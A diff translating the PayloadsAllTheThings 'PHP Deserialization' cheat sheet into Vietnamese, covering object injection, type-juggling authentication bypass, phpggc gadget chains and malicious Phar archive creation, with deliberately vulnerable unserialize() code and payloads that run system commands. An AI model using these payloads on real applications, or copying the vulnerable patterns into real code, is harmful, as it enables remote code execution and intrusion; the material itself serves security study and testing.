@@ -1,28 +1,28 @@
 # PHP Deserialization
 
-> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
+> PHP Object Injection là một lỗ hổng ở cấp độ ứng dụng có thể cho phép kẻ tấn công thực hiện nhiều loại tấn công độc hại khác nhau, chẳng hạn như Code Injection, SQL Injection, Path Traversal và Application Denial of Service, tùy thuộc vào ngữ cảnh. Lỗ hổng xảy ra khi dữ liệu đầu vào do người dùng cung cấp không được làm sạch đúng cách trước khi được truyền vào hàm `unserialize()` của PHP. Vì PHP cho phép tuần tự hóa đối tượng, kẻ tấn công có thể truyền các chuỗi đã được tuần tự hóa tùy ý vào lời gọi `unserialize()` dễ bị tổn thương, dẫn đến việc chèn các PHP object tùy ý vào phạm vi của ứng dụng.
 
-## Summary
+## Tóm tắt
 
-* [General Concept](#general-concept)
-* [Authentication Bypass](#authentication-bypass)
+* [Khái niệm tổng quát](#khái-niệm-tổng-quát)
+* [Vượt qua xác thực](#vượt-qua-xác-thực)
 * [Object Injection](#object-injection)
-* [Finding and Using Gadgets](#finding-and-using-gadgets)
-* [Phar Deserialization](#phar-deserialization)
-* [Real World Examples](#real-world-examples)
-* [References](#references)
+* [Tìm kiếm và sử dụng Gadget](#tìm-kiếm-và-sử-dụng-gadget)
+* [Phân giải tuần tự Phar](#phân-giải-tuần-tự-phar)
+* [Ví dụ thực tế](#ví-dụ-thực-tế)
+* [Tài liệu tham khảo](#tài-liệu-tham-khảo)
 
-## General Concept
+## Khái niệm tổng quát
 
-The following magic methods will help you for a PHP Object injection
+Các magic method sau sẽ hữu ích khi thực hiện PHP Object Injection:
 
-* `__wakeup()` when an object is unserialized.
-* `__destruct()` when an object is deleted.
-* `__toString()` when an object is converted to a string.
+* `__wakeup()` khi một object được unserialize.
+* `__destruct()` khi một object bị xóa.
+* `__toString()` khi một object được chuyển đổi thành string.
 
-Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.
+Ngoài ra, bạn cũng nên kiểm tra `Wrapper Phar://` trong [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar), vì nó sử dụng PHP Object Injection.
 
-Vulnerable code:
+Code dễ bị tổn thương:
 
 ```php
 <?php 
@@ -48,25 +48,25 @@ Vulnerable code:
 ?>
 ```
 
-Craft a payload using existing code inside the application.
+Tạo payload bằng cách sử dụng code có sẵn bên trong ứng dụng.
 
-* Basic serialized data
+* Dữ liệu được tuần tự hóa cơ bản
 
-    ```php
-    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
-    ```
+  ```php
+  a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
+  ```
 
-* Command execution
+* Thực thi lệnh
 
-    ```php
-    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
-    ```
+  ```php
+  string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
+  ```
 
-## Authentication Bypass
+## Vượt qua xác thực
 
 ### Type Juggling
 
-Vulnerable code:
+Code dễ bị tổn thương:
 
 ```php
 <?php
@@ -85,11 +85,11 @@ Payload:
 a:2:{s:8:"username";b:1;s:8:"password";b:1;}
 ```
 
-Because `true == "str"` is true.
+Bởi vì `true == "str"` là `true`.
 
 ## Object Injection
 
-Vulnerable code:
+Code dễ bị tổn thương:
 
 ```php
 <?php
@@ -116,37 +116,38 @@ Payload:
 O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
 ```
 
-We can do an array like this:
+Có thể tạo một array như sau:
 
 ```php
 a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
 ```
 
-## Finding and Using Gadgets
+## Tìm kiếm và sử dụng Gadget
 
-Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
+Còn được gọi là `"PHP POP Chains"`, chúng có thể được sử dụng để đạt được RCE trên hệ thống.
 
-* In PHP source code, look for `unserialize()` function.
-* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
-    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
-    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
-    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
-    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
-    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
-    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
-    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
-    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
-    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
-    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
-    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
-    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
-    * `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
-    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
-    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
-    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
-    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)
+* Trong source code PHP, tìm hàm `unserialize()`.
+* Các [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) đáng chú ý như `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()` và `__debugInfo()`:
 
-[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
+  * `__construct()`: PHP cho phép developer khai báo constructor method cho các class. Các class có constructor method sẽ gọi method này trên mỗi object mới được tạo, do đó nó phù hợp cho mọi quá trình khởi tạo mà object có thể cần trước khi được sử dụng. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
+  * `__destruct()`: Destructor method sẽ được gọi ngay khi không còn reference nào khác tới một object cụ thể, hoặc theo bất kỳ thứ tự nào trong quá trình shutdown. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
+  * `__call(string $name, array $arguments)`: Đối số `$name` là tên của method đang được gọi. Đối số `$arguments` là một array được đánh số chứa các tham số được truyền vào method có tên `$name`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
+  * `__callStatic(string $name, array $arguments)`: Đối số `$name` là tên của method đang được gọi. Đối số `$arguments` là một array được đánh số chứa các tham số được truyền vào method có tên `$name`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
+  * `__get(string $name)`: `__get()` được sử dụng để đọc dữ liệu từ các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
+  * `__set(string $name, mixed $value)`: `__set()` được chạy khi ghi dữ liệu vào các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
+  * `__isset(string $name)`: `__isset()` được kích hoạt khi gọi `isset()` hoặc `empty()` trên các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
+  * `__unset(string $name)`: `__unset()` được gọi khi `unset()` được sử dụng trên các property không thể truy cập (protected hoặc private) hoặc không tồn tại. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
+  * `__sleep()`: `serialize()` kiểm tra xem class có function với tên magic `__sleep()` hay không. Nếu có, function đó được thực thi trước bất kỳ quá trình serialization nào. Nó có thể dọn dẹp object và được kỳ vọng trả về một array chứa tên của tất cả biến trong object cần được serialized. Nếu method không trả về giá trị nào thì **null** sẽ được serialized và một **E_NOTICE** được phát ra. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
+  * `__wakeup()`: `unserialize()` kiểm tra sự tồn tại của function với tên magic `__wakeup()`. Nếu tồn tại, function này có thể khôi phục bất kỳ resource nào mà object có thể có. Mục đích sử dụng ban đầu của `__wakeup()` là thiết lập lại các database connection có thể đã bị mất trong quá trình serialization và thực hiện các tác vụ khởi tạo lại. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
+  * `__serialize()`: `serialize()` kiểm tra xem class có function với tên magic `__serialize()` hay không. Nếu có, function đó được thực thi trước bất kỳ quá trình serialization nào. Nó phải xây dựng và trả về một associative array gồm các cặp key/value đại diện cho dạng serialized của object. Nếu không trả về array, một TypeError sẽ được throw. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
+  * `__unserialize(array $data)`: function này sẽ nhận array đã được khôi phục, vốn được trả về từ `__serialize()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
+  * `__toString()`: Method `__toString()` cho phép một class quyết định cách nó phản ứng khi được xử lý như một string. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
+  * `__invoke()`: Method `__invoke()` được gọi khi một script cố gắng gọi một object như một function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
+  * `__set_state(array $properties)`: Static method này được gọi đối với các class được export bởi `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set-state)
+  * `__clone()`: Sau khi quá trình cloning hoàn tất, nếu một method `__clone()` được định nghĩa, `__clone()` của object mới được tạo sẽ được gọi để cho phép thay đổi các property cần thiết. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
+  * `__debugInfo()`: Method này được `var_dump()` gọi khi dump một object để lấy các property cần hiển thị. Nếu method không được định nghĩa trên object, tất cả public, protected và private property sẽ được hiển thị. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)
+
+[ambionics/phpggc](https://github.com/ambionics/phpggc) là một công cụ được xây dựng để tạo payload dựa trên nhiều framework:
 
 * Laravel
 * Symfony
@@ -163,84 +164,84 @@ phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
 phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
 ```
 
-## Phar Deserialization
+## Phân giải tuần tự Phar
 
-Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
+Sử dụng wrapper `phar://`, có thể kích hoạt quá trình deserialization trên file được chỉ định, chẳng hạn như trong `file_get_contents("phar://./archives/app.phar")`.
 
-A valid PHAR includes four elements:
+Một PHAR hợp lệ bao gồm bốn thành phần:
 
-1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
-2. **Manifest**: Contains metadata about the archive and its contents.
-3. **File Contents**: Contains the actual files in the archive.
-4. **Signature**(optional): For verifying archive integrity.
+1. **Stub**: Stub là một đoạn PHP code được thực thi khi file được truy cập trong một executable context. Tối thiểu, stub phải chứa `__HALT_COMPILER();` ở cuối. Ngoài điều này, không có hạn chế nào đối với nội dung của Phar stub.
+2. **Manifest**: Chứa metadata của archive và nội dung của nó.
+3. **File Contents**: Chứa các file thực tế bên trong archive.
+4. **Signature** *(tùy chọn)*: Dùng để xác minh tính toàn vẹn của archive.
 
-* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+* Ví dụ tạo một Phar để khai thác một `PDFGenerator` tùy chỉnh.
 
-    ```php
-    <?php
-    class PDFGenerator { }
+  ```php
+  <?php
+  class PDFGenerator { }
 
-    //Create a new instance of the Dummy class and modify its property
-    $dummy = new PDFGenerator();
-    $dummy->callback = "passthru";
-    $dummy->fileName = "uname -a > pwned"; //our payload
+  //Create a new instance of the Dummy class and modify its property
+  $dummy = new PDFGenerator();
+  $dummy->callback = "passthru";
+  $dummy->fileName = "uname -a > pwned"; //our payload
 
-    // Delete any existing PHAR archive with that name
-    @unlink("poc.phar");
+  // Delete any existing PHAR archive with that name
+  @unlink("poc.phar");
 
-    // Create a new archive
-    $poc = new Phar("poc.phar");
+  // Create a new archive
+  $poc = new Phar("poc.phar");
 
-    // Add all write operations to a buffer, without modifying the archive on disk
-    $poc->startBuffering();
+  // Add all write operations to a buffer, without modifying the archive on disk
+  $poc->startBuffering();
 
-    // Set the stub
-    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+  // Set the stub
+  $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
 
-    /* Add a new file in the archive with "text" as its content*/
-    $poc["file"] = "text";
-    // Add the dummy object to the metadata. This will be serialized
-    $poc->setMetadata($dummy);
-    // Stop buffering and write changes to disk
-    $poc->stopBuffering();
-    ?>
-    ```
+  /* Add a new file in the archive with "text" as its content*/
+  $poc["file"] = "text";
+  // Add the dummy object to the metadata. This will be serialized
+  $poc->setMetadata($dummy);
+  // Stop buffering and write changes to disk
+  $poc->stopBuffering();
+  ?>
+  ```
 
-* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
+* Ví dụ tạo một Phar với magic byte header của `JPEG`, vì không có giới hạn đối với nội dung của stub.
 
-    ```php
-    <?php
-    class AnyClass {
-        public $data = null;
-        public function __construct($data) {
-            $this->data = $data;
-        }
-        
-        function __destruct() {
-            system($this->data);
-        }
-    }
+  ```php
+  <?php
+  class AnyClass {
+      public $data = null;
+      public function __construct($data) {
+          $this->data = $data;
+      }
+      
+      function __destruct() {
+          system($this->data);
+      }
+  }
 
-    // create new Phar
-    $phar = new Phar('test.phar');
-    $phar->startBuffering();
-    $phar->addFromString('test.txt', 'text');
-    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+  // create new Phar
+  $phar = new Phar('test.phar');
+  $phar->startBuffering();
+  $phar->addFromString('test.txt', 'text');
+  $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
 
-    // add object of any class as meta data
-    $object = new AnyClass('whoami');
-    $phar->setMetadata($object);
-    $phar->stopBuffering();
-    ```
+  // add object of any class as meta data
+  $object = new AnyClass('whoami');
+  $phar->setMetadata($object);
+  $phar->stopBuffering();
+  ```
 
-## Real World Examples
+## Ví dụ thực tế
 
 * [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
 * [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
 * [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
 * [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)
 
-## References
+## Tài liệu tham khảo
 
 * [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://web.archive.org/web/20210514112950/https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
 * [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
